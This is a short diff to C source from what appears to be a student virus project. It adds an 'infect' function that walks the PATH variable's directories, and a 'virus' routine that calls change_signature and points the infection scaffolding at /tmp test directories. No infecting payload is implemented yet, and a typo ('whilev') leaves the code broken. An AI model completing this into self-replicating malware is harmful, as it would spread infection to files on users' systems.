@@ -70,6 +70,32 @@ int get_env_var(char *name, char *content, int content_size)
 		close(fd);
 	return (content[0] != '\0');
 }
+
+int infect(char path[],size_t path_length)
+{
+	size_t i = 0;
+	int length_path =0;
+	do
+	{
+		if(path[i] == ':')
+		{
+			path[i] = '\0';
+			//call get_dir with the - leng_word
+			printf("1 path %s\n",&path[i] - length_path);
+			length_path = -1;
+			path[i] = ':';
+
+		}
+		else if (path[i] == '\0')
+			break ;
+		i++;
+		length_path++;
+	}
+	whilev(i < path_length);
+	return 0;
+}
+
+
 //BSS:
 //UN MAGIC NUMBER
 //UN BUFFER POUR LE PATH
@@ -80,9 +106,11 @@ int virus(void)
 		change_signature();
 	printf("virus\n");
 	char path[256];
-	int ret  = get_env_var("PATH=",path,256);
+	memmove(path,"/tmp/test:/tmp/test2:",21);
+	printf("content: %s\n",path);
 
-	printf("ret %d\n",ret);
+	get_env_var("PATH=",path + 21,256 - 21);
+	infect(path, 256);
 	printf("content: %s\n",path);
 	return (0);
 }
